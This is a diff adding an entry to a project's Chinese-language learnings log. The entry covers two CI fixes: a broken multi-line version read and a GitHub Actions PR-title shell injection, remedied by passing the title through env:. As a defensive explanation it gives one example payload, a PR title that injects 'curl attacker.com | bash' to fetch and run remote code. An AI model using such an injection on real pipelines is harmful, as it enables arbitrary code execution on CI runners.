@@ -1,5 +1,44 @@
 # Cecelia Core Learnings
 
+### [2026-03-02] CI 定时炸弹修复：check-version-sync 多行读取 + engine-ci PR 标题注入 (PR #304)
+
+**失败统计**：CI 失败 0 次，本地验证失败 0 次
+
+**踩坑 1：.brain-versions 多行读取导致永久 version mismatch**
+
+`check-version-sync.sh` 用 `cat .brain-versions | tr -d '\n'` 读版本：
+- `tr -d '\n'` 删换行符，把所有行拼成一串（例：`1.152.01.153.0`）
+- `brain-deploy.sh` 每次部署追加一行，第二次部署后就永远无法匹配
+- 结果：所有 Brain PR 在首次真实部署后被永久卡死
+
+修复：`tail -1 .brain-versions` — 只取最后一行（最新版本）
+
+**踩坑 2：GitHub Actions PR 标题 shell 注入**
+
+`${{ github.event.pull_request.title }}` 是 GitHub Actions 表达式，在 `run:` 块内联展开时等价于直接把用户输入嵌入 shell，可被 `$()` 或反引号注入：
+
+```yaml
+# 危险：PR 标题为 "; curl attacker.com | bash #" 时执行任意命令
+run: |
+  PR_TITLE="${{ github.event.pull_request.title }}"
+```
+
+修复：在步骤级 `env:` 块声明，shell 里直接用 `$PR_TITLE`（环境变量，不被 shell 二次展开）：
+
+```yaml
+env:
+  PR_TITLE: ${{ github.event.pull_request.title }}
+run: |
+  # 安全：$PR_TITLE 是环境变量，不被 shell 解析
+  if [[ ! "$PR_TITLE" =~ \[INFRA\] ]]; then ...
+```
+
+**注意**：`if:` 条件块里的 `github.event.pull_request.title` 由 GitHub Actions 自己处理，不是 shell 注入风险，不需要改。
+
+**预防措施**：
+- CI 脚本中所有用户可控输入（PR 标题、分支名）必须通过 `env:` 块传递，不能内联展开
+- `tr -d '\n'` 会拼接所有行，读单行用 `tail -1` 或 `head -1`
+
 ### [2026-03-02] 修复 CI/CD 部署集成缺口（cleanup.sh + brain-deploy.sh）(PR #302, Engine v12.35.9)
 
 **失败统计**：CI 失败 1 次，本地测试失败 0 次
